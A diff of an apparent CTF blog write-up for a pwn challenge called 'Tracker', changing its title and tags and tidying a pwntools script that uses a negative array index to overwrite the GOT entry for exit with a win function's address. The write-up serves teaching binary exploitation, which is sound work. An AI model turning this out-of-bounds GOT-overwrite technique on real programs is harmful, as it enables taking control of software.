@@ -2,11 +2,11 @@
 
 layout: post
 
-title: "Tracker - Negative Index to GOT Overwrite"
+title: "Tracker - NileCTF 2026"
 
 date: 2026-09-25
 
-tags: [ctf, pwn]
+tags: [ctf, pwn, my-challenge]
 
 ---
 
@@ -212,30 +212,18 @@ After the overwrite, the program reaches `exit(0)`, looks up the address in the 
 
 from pwn import *
 
-
-
 elf = ELF("./tracker")
 
 p = process("./tracker")
-
-
 
 offset_bytes = elf.got['exit'] - elf.sym['notes']
 
 index = offset_bytes // 8
 
-
-
 p.sendlineafter(b"Index: ", str(index).encode())
-
 p.sendlineafter(b"Value: ", str(elf.sym['win']).encode())
-
-
 
 p.interactive()
 
 ```
 
-
-
-The script loads the binary with pwntools, calculates the index from the symbol add
